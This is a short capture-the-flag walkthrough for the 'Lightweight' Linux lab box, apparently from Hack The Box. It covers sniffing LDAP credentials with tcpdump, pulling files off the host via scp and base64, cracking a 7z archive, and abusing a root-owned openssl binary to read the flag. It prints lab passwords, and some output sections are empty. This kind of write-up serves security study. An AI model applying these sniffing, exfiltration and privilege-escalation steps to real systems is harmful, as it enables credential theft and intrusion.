# Lightweight
### Info:
OS: Linux<br>
IP: 10.10.10.119<br>
Difficulty : Medium<br>
### Enumeration:
```nmap -sC -sV -oA nmap 10.10.10.119``` <br>

gives us the results : <br>

We cannot run dirb etc because, it bans us for 5 minutes. <br>
Rather we can just ssh in via our ip address in the box.
<br>
### Exploitation:
Running `getcap` gives us :

Via tcpdump :
```
tcpdump -i any -w packets.pcap
```

To export the pcap file :
```
scp 10.10.16.5@10.10.10.119:/home/10.10.16.5/temp/all.pcap /root/Desktop/boxes/LightWeight/
```
And viewing those packets in wireshark gives us the password for ldapuser2.

Via these creds we can su into the ldapuser2.
```
Username: ldapuser2
Password: 8bc8251332abe1d7f105d3e53ad39ac2
```
### Privilege Escalation (for user : ldapuser1):
We see a backup.7z file, which cannot we transfered directly. We can either user msf or base64 technique.
```
$ cat backup.7z | base 64 (on the box)
and to decrypt
$ base64 â€“d enc_backup > backup.7z 
```
Using https://www.lostmypass.com/file-types/7z/ we get the password for the 7z as `delete`  <br>
We can also use https://raw.githubusercontent.com/Seyptoo/7z-BruteForce/master/latex.py break the 7z. <br>
Now running strings we get the creds for ldapuser1 :
```
root@kali:~/Desktop/boxes/LightWeight/files# strings status.php | grep password
$password = 'f3ca9d298a553da117442deeb6fa932d';
```
we find a openssl present inside this user, which was owned by root. <br>
Therefore we encrypted the root.txt and saved it on the user and then decrypted it to get the flag.

We can also get root on this shell (didnot try after getting the hash). 
### Gained knowledge:
ldap enumerations <br>
base64 decode encode to retrieve files <br>
getcap <br>
openssl <br>
